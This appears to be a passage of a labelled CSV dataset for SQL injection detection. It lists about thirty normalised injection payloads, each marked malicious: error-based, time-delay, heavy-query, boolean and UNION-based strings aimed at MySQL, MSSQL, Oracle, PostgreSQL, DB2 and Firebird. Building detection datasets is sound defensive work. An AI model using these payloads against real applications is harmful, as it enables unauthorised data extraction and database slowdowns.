row_index,payload_norm,label,sqli_type_hint
3900,"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,1,
3901,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1,
3902,"1 ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
3903,"1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3904,1'|| ( select 'boxx' where 2038 = 2038 and 9198 = 9198--,1,
3905,"1%"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3906,"-4304' where 1005 = 1005 union all select 1005,1005#",1,
3907,"1 ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",1,
3908,1'+ ( select 'zjvx' where 4683 = 4683 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',1,
3909,"1%' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( '%' = '",1,
3910,"1'|| ( select 'txyy' where 6500 = 6500 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",1,
3911,"1 ) where 8164 = 8164 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3912,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'nxkp' like 'nxkp,1,
3913,-2625' ) ) or 3038 = 3038,1,
3914,"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'miba' = 'miba",1,
3915,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""vwep"" like ""vwep",1,
3916,"1%"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""%"" = """,1,
3917,"1' ) ) as orvy where 7270 = 7270 union all select null,null,null,null,null,null,null,null#",1,
3918,"1"" ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""dwcy"" = ""dwcy",1,
3919,"-1218' union all select 2663,2663,2663,2663--",1,
3920,1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
3921,"1 ) union all select null,null,null#",1,
3922,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( ""oiuw"" = ""oiuw",1,
3923,"1' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
3924,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'qvoy' = 'qvoy",1,
3925,"-5160' ) as kgjw where 9609 = 9609 union all select 9609,9609--",1,
3926,1%' ) ) ) waitfor delay '0:0:5' and ( ( ( '%' = ',1,
3927,"-5187"" ) union all select 3373,3373#",1,
3928,"-1807' ) ) union all select 9853,9853,9853,9853,9853,9853#",1,
3929,"-7240' ) ) union all select 8064,8064,8064#",1,
